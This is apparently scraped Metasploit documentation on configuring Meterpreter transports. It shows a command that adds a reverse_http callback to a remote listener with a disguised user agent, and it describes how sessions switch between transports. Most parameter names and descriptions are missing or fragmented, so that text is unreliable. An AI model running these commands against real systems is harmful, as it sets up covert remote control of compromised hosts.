## On this page
## Transport configuration
## The `transport` command
The following output shows the current help text for the `transport` command:
```msf
meterpreter > transport add -t reverse_http -l 10.1.10.40 -p 5105 -T 50000 -W 2500 -C 100000 -A "Totes-Legit Browser/1.1"
[*] Adding new transport ...
[+] Successfully added reverse_http transport.
```

`msf
meterpreter > transport add -t reverse_http -l 10.1.10.40 -p 5105 -T 50000 -W 2500 -C 100000 -A "Totes-Legit Browser/1.1"
[*] Adding new transport ...
[+] Successfully added reverse_http transport.
`

` command. Here's a deeper explanation of the parameters:

* The `

` because Meterpreter always uses the WinHTTP API behind the scenes anyway.
* The `

` parameter.
* The `

` parameter.
* The `

`.
* The `

`.
* The `

`. The measure of this value is in seconds and should be a positive integer.
* The `

` specifies a custom user agent that is used for HTTP requests.

It is also possible to specify the following:

* The `

`) value that is prepended to the UUID URI that is used for all requests. This URI value helps segregate listeners and payloads based on a URI.
* The `

` option specifies a proxy host/IP. This parameter is optional.
* The `

`.
* The `

` is set.
* The `

` option specifies the username to use to authenticate with the proxy. This parameter is optional.
* The `

` option specifies the password to use to authenticate with the proxy. This parameter is optional.
* The `

` option specifies the overall Meterpreter session timeout value. While this value is not transport-specific, the option is provided here so that it can be set alongside the other transport-specific timeout values for ease of use.
* Finally the `

`

Note that these examples only add new transports, they do not change the current transport mechanism. When a transport is added to the list of transports, they are always added at the _end_ of the list, and not the start.

### Change transports

There are three different ways to change transports. One thing they do have in common is that transport switching assumes that you have listeners set up to receive the connections. If no listener or handler is present, then the resiliency features in Meterpreter will cause it to constantly attempt to establish connectivity on that transport using the transport timeout values that were configured. If the transport ultimately fails, then Meterpreter will cycle to the next transport on the list and try again. This will continue until a transport connection is successful, or the session timeout expires. More information on this can be found in the **session resiliency documentation** (link coming soon).

The three different ways to change transports are:

* `

` - This command will cause Meterpreter to shut down the current transport, and attempt to reconnect to Metasploit using the next transport in the list of transports.
* `

`, except that it will move to the previous transport on the list, and not the next one.
* `

` in that it takes a subset of the parameters, and then adds a new one on top of it:

* `

` - The transport type.
* `

`).
* `

` value.
* `

`msf
./msfconsole -r ~/msf.rc
[*] Starting the Metasploit Framework console...|
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`

